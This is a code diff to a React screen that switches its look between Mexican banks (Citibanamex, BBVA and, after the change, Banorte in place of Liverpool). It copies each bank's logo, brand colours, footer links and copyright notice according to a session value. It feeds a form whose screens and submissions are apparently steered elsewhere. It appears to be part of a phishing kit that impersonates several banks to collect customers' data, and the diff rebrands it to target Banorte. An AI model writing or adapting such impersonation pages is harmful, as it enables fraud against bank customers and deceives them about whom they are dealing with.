@@ -153,11 +153,11 @@ export default function ClientScreen() {
       );
     } else {
       return (
-        <header className="bg-[#e10098] text-white p-4 text-center">
+        <header className="bg-[#EC1C24] text-white p-4 text-center">
           <img 
-            src={liverpoolLogo} 
+            src={banorteLogo} 
             className="h-20 inline-block" 
-            alt="Liverpool" 
+            alt="Banorte" 
           />
           <div className="font-bold text-sm mt-2">{formatDate(new Date())}</div>
         </header>
@@ -191,29 +191,29 @@ export default function ClientScreen() {
             <a href="#" className={`${
               sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
               sessionData.banco === 'BBVA' ? 'text-[#072146]' :
-              'text-[#e10098]'
+              'text-[#EC1C24]'
             } mx-2`}>Aprende más</a>
             <a href="#" className={`${
               sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
               sessionData.banco === 'BBVA' ? 'text-[#072146]' :
-              'text-[#e10098]'
+              'text-[#EC1C24]'
             } mx-2`}>Ayuda</a>
             <a href="#" className={`${
               sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
               sessionData.banco === 'BBVA' ? 'text-[#072146]' :
-              'text-[#e10098]'
+              'text-[#EC1C24]'
             } mx-2`}>Términos y condiciones</a>
             <a href="#" className={`${
               sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
               sessionData.banco === 'BBVA' ? 'text-[#072146]' :
-              'text-[#e10098]'
+              'text-[#EC1C24]'
             } mx-2`}>Seguridad en línea</a>
           </div>
 
           <div className={`${
             sessionData.banco === 'CITIBANAMEX' ? 'bg-[#005BAC]' : 
             sessionData.banco === 'BBVA' ? 'bg-[#072146]' :
-            'bg-[#e10098]'
+            'bg-[#EC1C24]'
           } text-white p-4 text-center text-sm`}>
             <div className="mb-3">
               <a href="#" className="text-white mx-2">Contáctanos</a> |
@@ -225,7 +225,7 @@ export default function ClientScreen() {
             <div>© {
               sessionData.banco === 'CITIBANAMEX' ? 'Banamex' : 
               sessionData.banco === 'BBVA' ? 'BBVA' :
-              'Liverpool'
+              'Banorte'
             } México 2024. Todos los Derechos Reservados</div>
           </div>
         </footer>
@@ -297,7 +297,7 @@ export default function ClientScreen() {
           currentScreen={currentScreen} 
           screenData={screenData}
           onSubmit={handleSubmit}
-          banco={sessionData.banco || 'LIVERPOOL'}
+          banco={sessionData.banco || 'BANORTE'}
         />
       </div>
 
